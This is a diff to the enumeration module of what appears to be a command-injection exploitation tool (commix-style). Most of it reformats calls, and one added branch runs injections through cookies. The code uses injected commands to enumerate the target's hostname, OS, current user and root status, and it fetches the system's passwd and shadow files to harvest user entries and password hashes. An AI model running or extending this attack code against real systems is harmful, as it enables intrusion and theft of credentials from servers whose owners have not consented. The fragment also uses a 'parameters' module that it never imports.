@@ -19,8 +19,8 @@ import time
 
 from src.utils import menu
 from src.utils import settings
-from src.thirdparty.colorama import Fore, Back, Style, init
 
+from src.thirdparty.colorama import Fore, Back, Style, init
 from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_injector
 
 """
@@ -33,7 +33,7 @@ def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,O
   # Hostname enumeration
   if menu.options.hostname:
     cmd = settings.HOSTNAME
-    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+    check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
     shell = output 
     if shell:
       shell = "".join(str(p) for p in output)
@@ -43,13 +43,13 @@ def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,O
   # "Retrieve certain system information (operating system, hardware platform)
   if menu.options.sys_info:
     cmd = settings.RECOGNISE_OS            
-    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+    check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
     target_os = output
     if target_os:
       target_os = "".join(str(p) for p in output)
       if target_os == "Linux":
         cmd = settings.RECOGNISE_HP
-        check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+        check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
         target_arch = output
         if target_arch:
           target_arch = "".join(str(p) for p in target_arch)
@@ -63,14 +63,19 @@ def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,O
   # The current user enumeration
   if menu.options.current_user:
     cmd = settings.CURRENT_USER
-    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
+      # Check if target host is vulnerable to cookie injection.
+      vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie) 
+      check_how_long, output  = tfb_injector.cookie_injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    else:
+      check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
     cu_account = output
     if cu_account:
       cu_account = "".join(str(p) for p in output)
       # Check if the user have super privilleges.
       if menu.options.is_root:
         cmd = settings.ISROOT
-        check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+        check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
         if shell:
           sys.stdout.write(Style.BRIGHT + "\n\n  (!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
           if shell != "0":
@@ -88,7 +93,7 @@ def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,O
     sys.stdout.write("\n(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
     sys.stdout.flush()
     cmd = settings.SYS_USERS             
-    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+    check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
     sys_users = output
     if sys_users :
       sys_users = "".join(str(p) for p in sys_users)
@@ -127,7 +132,7 @@ def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,O
     sys.stdout.write("\n(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
     sys.stdout.flush()
     cmd = settings.SYS_PASSES            
-    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+    check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
     sys_passes = output
     if sys_passes :
       sys_passes = "".join(str(p) for p in sys_passes)
